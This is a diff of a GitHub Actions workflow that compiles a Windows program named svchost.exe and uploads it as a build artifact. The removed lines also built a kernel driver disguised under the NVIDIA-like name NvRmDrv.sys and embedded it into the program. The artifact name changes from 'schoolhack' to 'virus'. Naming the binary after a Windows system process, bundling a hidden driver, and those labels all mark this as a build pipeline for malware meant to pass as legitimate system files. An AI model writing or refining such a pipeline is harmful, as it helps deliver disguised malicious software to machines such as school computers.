@@ -10,90 +10,13 @@ jobs:
     runs-on: windows-2022
     steps:
       - uses: actions/checkout@v4
-
-      - name: Install winget
-        uses: Cyberboss/install-winget@v1
-        with:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: Install WDK
-        shell: pwsh
-        run: |
-          Write-Host "Installing WDK via winget..."
-          winget install --source winget --exact --id Microsoft.WindowsWDK.10.0.26100 --silent --accept-package-agreements --accept-source-agreements
-          if ($LASTEXITCODE -ne 0) { throw "WDK install failed" }
-
-          Write-Host "Locating WDK.vsix..."
-          $candidates = @(
-            "C:\Program Files (x86)\Windows Kits\10\Vsix\VS2022\10.0.26100.0\WDK.vsix",
-            "C:\Program Files (x86)\Windows Kits\10\Vsix\VS2022\10.0.26100.0\amd64\WDK.vsix",
-            "C:\Program Files (x86)\Windows Kits\10\Vsix\VS2022\WDK.vsix",
-            "C:\Program Files (x86)\Windows Kits\10\Vsix\WDK.vsix"
-          )
-          $vsixPath = $null
-          foreach ($p in $candidates) {
-            if (Test-Path $p) { $vsixPath = $p; break }
-          }
-          if (-not $vsixPath) {
-            $found = Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\Vsix" -Recurse -Filter "WDK.vsix" -ErrorAction SilentlyContinue | Select-Object -First 1
-            if ($found) { $vsixPath = $found.FullName }
-          }
-          if (-not $vsixPath) {
-            Write-Host "Contents of Vsix dir:"
-            Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\Vsix" -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
-            throw "WDK.vsix not found anywhere"
-          }
-          Write-Host "Found VSIX at: $vsixPath"
-
-          Write-Host "Installing WDK VSIX..."
-          $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
-          $vsInstaller = & $vswhere -nologo -latest -products * -property enginePath
-          $vsixInstaller = Join-Path $vsInstaller 'VSIXInstaller.exe'
-          Start-Process -FilePath $vsixInstaller -ArgumentList "/q", "/a", "`"$vsixPath`"" -Wait -NoNewWindow
-
-          $km = Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\Include" -Directory |
-                Where-Object { Test-Path (Join-Path $_.FullName "km\ntddk.h") } |
-                Sort-Object Name -Descending | Select-Object -First 1
-          if (-not $km) { throw "WDK install failed: no km\ntddk.h" }
-          Write-Host "WDK headers at: $($km.FullName)"
-
-      - name: Build driver
+      - name: Build
         shell: cmd
         run: |
-          call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
-          cl /nologo /kernel /GS- /O2 /W3 /c drv\NvRmDrv.c ^
-             /Fo:drv\NvRmDrv.obj ^
-             /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\km" ^
-             /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\shared" ^
-             /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\ucrt"
+          g++ -O2 -municode -mwindows -static -static-libgcc -static-libstdc++ main.cpp -o svchost.exe -lnetapi32 -lws2_32 -ladvapi32 -luser32 -lgdi32 -lole32 -lshell32
           if errorlevel 1 exit /b 1
-          link /nologo /DRIVER /SUBSYSTEM:NATIVE /ENTRY:DriverEntry ^
-             /OUT:drv\NvRmDrv.sys drv\NvRmDrv.obj ^
-             /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.26100.0\km\x64" ^
-             ntoskrnl.lib hal.lib ntstrsafe.lib
-          if errorlevel 1 exit /b 1
-          dir drv\NvRmDrv.sys
-
-      - name: Build bin2h
-        shell: cmd
-        run: |
-          g++ -O2 bin2h.cpp -o bin2h.exe
-          if errorlevel 1 exit /b 1
-          bin2h.exe drv\NvRmDrv.sys driver_blob.h
-          if errorlevel 1 exit /b 1
-          dir driver_blob.h
-
-      - name: Build svchost.exe
-        shell: cmd
-        run: |
-          g++ -O2 -municode -mwindows -static -static-libgcc -static-libstdc++ ^
-              main.cpp -o svchost.exe ^
-              -lnetapi32 -lws2_32 -ladvapi32 -luser32 -lgdi32 -lole32 -lshell32
-          if errorlevel 1 exit /b 1
-          dir svchost.exe
-
-      - name: Upload artifact
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: schoolhack
+          name: virus
           path: svchost.exe
